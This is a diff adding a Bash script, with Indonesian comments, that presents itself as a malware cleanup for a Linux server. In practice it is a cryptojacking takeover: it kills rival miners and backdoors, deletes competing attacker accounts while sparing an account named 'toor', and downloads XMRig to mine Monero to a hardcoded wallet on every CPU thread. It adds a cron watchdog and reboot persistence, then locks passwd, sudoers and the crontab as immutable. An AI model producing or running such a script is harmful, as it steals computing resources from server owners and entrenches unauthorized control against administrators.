@@ -1,0 +1,206 @@
+#!/bin/bash
+echo "=============================="
+echo " FULL SETUP - CLEAN & MINING"
+echo "=============================="
+
+WALLET="4AJfLf4QvpNjGCSjuqRK3RAJYP2x6JsBV8vqBcNzqgZZcLUQiExCwV1Wp7Jnf5N3koKy6PZ931Yu4SKtX3bqy21A8f7s4oT"
+POOL="pool.supportxmr.com:443"
+WORKER="X_BARU"
+#WORKER=$(hostname)
+THREADS=$(nproc)
+INSTALL_DIR="/usr/local/bin/xmrig-6.21.0"
+LOG="/tmp/xmrig.log"
+WATCHDOG_PATH="/usr/local/bin/miner_watchdog.sh"
+
+# Tentukan lokasi file crontab root secara dinamis berdasarkan OS
+CRON_FILE="/var/spool/cron/root"
+if [ -d "/var/spool/cron/crontabs" ]; then
+    CRON_FILE="/var/spool/cron/crontabs/root"
+fi
+
+# ==============================
+# [1] KILL SEMUA PROSES MALWARE
+# ==============================
+echo "[1] Kill proses malware..."
+pkill -f "ld-linux.so" 2>/dev/null
+pkill -f "logo.svg" 2>/dev/null
+pkill -f "gs-netcat" 2>/dev/null
+pkill -f "gsocket" 2>/dev/null
+pkill -f "c3pool" 2>/dev/null
+pkill -f "xmrigMiner" 2>/dev/null
+pkill -f "syslogd -c config" 2>/dev/null
+pkill -f "run_miner" 2>/dev/null
+pkill -f "moneroocean" 2>/dev/null
+pkill -f "xmrigcc" 2>/dev/null
+pkill -f "kworker/0:0" 2>/dev/null
+pkill -f "kworker/0:13" 2>/dev/null
+for PID in $(ps aux | grep -E "kernel|\.ld-linux" | grep -v grep | grep -v "\[md" | grep -v "\[kernel" | grep -v xmrig | awk '{print $2}'); do
+    kill -9 $PID 2>/dev/null
+done
+killall xmrig 2>/dev/null
+sleep 2
+echo "Done"
+
+# ==============================
+# [2] HAPUS FILE MALWARE
+# ==============================
+echo "[2] Hapus file malware..."
+chattr -R -ai /usr/.local/ /usr/share/.gs/ /etc/systemd/syslogd /opt/xmrigcc /root/.local /home/.logo.svg 2>/dev/null
+rm -rf /usr/.local/
+rm -rf /usr/share/.gs/
+rm -rf /opt/xmrigcc/
+rm -rf /etc/systemd/syslogd
+rm -rf /etc/systemd/xmrigMiner
+rm -rf /etc/systemd/run_miner.sh
+rm -rf /etc/systemd/config.json
+rm -rf /root/moneroocean/
+rm -rf /root/.local/
+rm -rf /home/.logo.svg
+rm -rf /usr/bin/defunct
+#find /home -name ".cache" -type d -exec rm -rf {}/.svc \; 2>/dev/null
+#find /home -name "c3pool" -type d -exec rm -rf {} \; 2>/dev/null
+#find /tmp /var/tmp -name ".*" -type f -delete 2>/dev/null
+echo "Done"
+
+# ==============================
+# [3] HAPUS USER HACKER (BUKAN toor)
+# ==============================
+echo "[3] Hapus user hacker..."
+for u in pakchoi toor0 admin0; do
+    if id $u &>/dev/null; then
+        userdel -rf $u 2>/dev/null
+        sed -i "/$u/d" /etc/passwd 2>/dev/null
+        sed -i "/$u/d" /etc/group 2>/dev/null
+        sed -i "/$u/d" /etc/sudoers 2>/dev/null
+        rm -f /etc/sudoers.d/99-$u
+        chattr -i /etc/shadow 2>/dev/null
+        sed -i "/$u/d" /etc/shadow 2>/dev/null
+        chattr +i /etc/shadow 2>/dev/null
+        echo "User $u dihapus"
+    fi
+done
+echo "Done"
+
+# ==============================
+# [4] BERSIHKAN CRONTAB SEMUA USER
+# ==============================
+echo "[4] Bersihkan crontab semua user..."
+for user in $(cut -d: -f1 /etc/passwd); do
+    [ "$user" = "toor" ] && continue
+    crontab -l -u $user 2>/dev/null | grep -v "run.sh\|usr/.local\|kworker\|syslogd\|ld-linux\|c3pool\|base64\|logo.svg\|execssh\|xmrigMiner\|moneroocean\|gulf\|86ctqu\|gs-netcat\|gsocket\|cdnsiteler\|xmrigcc\|defunct\|start\.sh\|pakchoi\|toor0\|admin0" | crontab -u $user - 2>/dev/null
+done
+echo "Done"
+
+# ==============================
+# [5] DOWNLOAD XMRIG JIKA BELUM ADA
+# ==============================
+echo "[5] Cek/Download XMRig..."
+if [ ! -f "$INSTALL_DIR/xmrig" ]; then
+    echo "Downloading XMRig..."
+    cd /tmp
+    wget -q --no-check-certificate https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
+    tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
+    mkdir -p /usr/local/bin
+    cp -r /tmp/xmrig-6.21.0 /usr/local/bin/
+    echo "XMRig downloaded"
+else
+    echo "XMRig sudah ada"
+fi
+chmod +x $INSTALL_DIR/xmrig
+
+# ==============================
+# [6] BERSIHKAN RAM
+# ==============================
+echo "[6] Bersihkan RAM..."
+sync && echo 3 > /proc/sys/vm/drop_caches
+echo "Done"
+
+# ==============================
+# [7] JALANKAN MINING
+# ==============================
+echo "[7] Jalankan mining..."
+cd $INSTALL_DIR
+nohup ./xmrig -o $POOL --tls -u $WALLET -p x -k --rig-id $WORKER -t $THREADS --donate-level 1 2>&1 | tee $LOG &
+sleep 5
+echo "Done - PID: $(pgrep -x xmrig)"
+
+# ==============================
+# [8] SETUP CRONTAB GANDA (AUTO-START & WATCHDOG 10 MENIT)
+# ==============================
+echo "[8] Setup crontab auto-start & watchdog..."
+
+# Buka kunci cron jika terproteksi imutabel dari eksekusi sebelumnya
+chattr -i /var/spool/cron/root /var/spool/cron/crontabs/root /etc/crontab 2>/dev/null
+
+# A. Membuat berkas skrip Watchdog terpisah secara presisi
+cat << 'WATCHDOG_EOF' > "$WATCHDOG_PATH"
+#!/bin/bash
+INSTALL_DIR="/usr/local/bin/xmrig-6.21.0"
+LOG="/tmp/xmrig.log"
+WALLET="4AJfLf4QvpNjGCSjuqRK3RAJYP2x6JsBV8vqBcNzqgZZcLUQiExCwV1Wp7Jnf5N3koKy6PZ931Yu4SKtX3bqy21A8f7s4oT"
+POOL="pool.supportxmr.com:443"
+WORKER=$(hostname)
+THREADS=$(nproc)
+
+# Mencocokkan nama proses biner xmrig secara akurat
+if pgrep -x "xmrig" > /dev/null; then
+    echo "[$(date)] Watchdog: Mining aktif. Kembali tidur..." >> $LOG
+    exit 0
+else
+    echo "[$(date)] Watchdog: MINING MATI! Menyalakan ulang mesin..." >> $LOG
+    sync && echo 3 > /proc/sys/vm/drop_caches
+    cd $INSTALL_DIR
+    nohup ./xmrig -o $POOL --tls -u $WALLET -p x -k --rig-id $WORKER -t $THREADS --donate-level 1 2>&1 | tee $LOG &
+fi
+WATCHDOG_EOF
+
+chmod +x "$WATCHDOG_PATH"
+
+# B. Daftarkan entri menggunakan direct-write ke spool yang aktif
+crontab -r 2>/dev/null
+
+cat << CRON_EOF > "$CRON_FILE"
+@reboot sleep 10 && cd $INSTALL_DIR && nohup ./xmrig -o $POOL --tls -u $WALLET -p x -k --rig-id $WORKER -t $THREADS --donate-level 1 2>&1 | tee $LOG &
+*/10 * * * * $WATCHDOG_PATH >/dev/null 2>&1
+CRON_EOF
+
+# Set permission crontab standard (600)
+chmod 600 "$CRON_FILE"
+
+# Restart cron daemon agar perubahan langsung diterapkan
+if command -v systemctl &>/dev/null; then
+    systemctl restart cron 2>/dev/null || systemctl restart crond 2>/dev/null
+else
+    service cron restart 2>/dev/null || service crond restart 2>/dev/null
+fi
+echo "Done"
+
+# ==============================
+# [9] KUNCI FILE PENTING
+# ==============================
+echo "[9] Kunci file sistem..."
+chattr +i /etc/passwd /etc/group /etc/sudoers 2>/dev/null
+# Mengunci berkas crontab setelah dipastikan terisi data baru
+chattr +i "$CRON_FILE" 2>/dev/null
+echo "Done"
+
+echo ""
+echo "=============================="
+echo " VERIFIKASI AKHIR"
+echo "=============================="
+echo -n "[CEK] /usr/.local      : " && ls /usr/.local/ 2>/dev/null || echo "BERSIH"
+echo -n "[CEK] /usr/share/.gs   : " && ls /usr/share/.gs/ 2>/dev/null || echo "BERSIH"
+echo -n "[CEK] /opt/xmrigcc     : " && ls /opt/xmrigcc/ 2>/dev/null || echo "BERSIH"
+echo -n "[CEK] /home/.logo.svg  : " && ls /home/.logo.svg 2>/dev/null || echo "BERSIH"
+echo -n "[CEK] user pakchoi     : " && id pakchoi 2>/dev/null || echo "TERHAPUS"
+echo -n "[CEK] user toor        : " && id toor 2>/dev/null || echo "TIDAK ADA"
+echo -n "[CEK] Proses malware   : "
+COUNT=$(ps aux | grep -E "ld-linux|logo.svg|gs-netcat|xmrigcc|moneroocean|86ctqu" | grep -v grep | wc -l)
+[ "$COUNT" -eq 0 ] && echo "BERSIH" || echo "MASIH ADA $COUNT proses"
+echo "[CEK] Crontab root     :"
+crontab -l 2>/dev/null | grep -v "perl\|warning\|LANG\|LC_ALL\|LANGUAGE"
+echo "[CEK] XMRig status     :"
+ps aux | grep xmrig | grep -v grep
+echo "=============================="
+echo " SELESAI"
+echo "=============================="
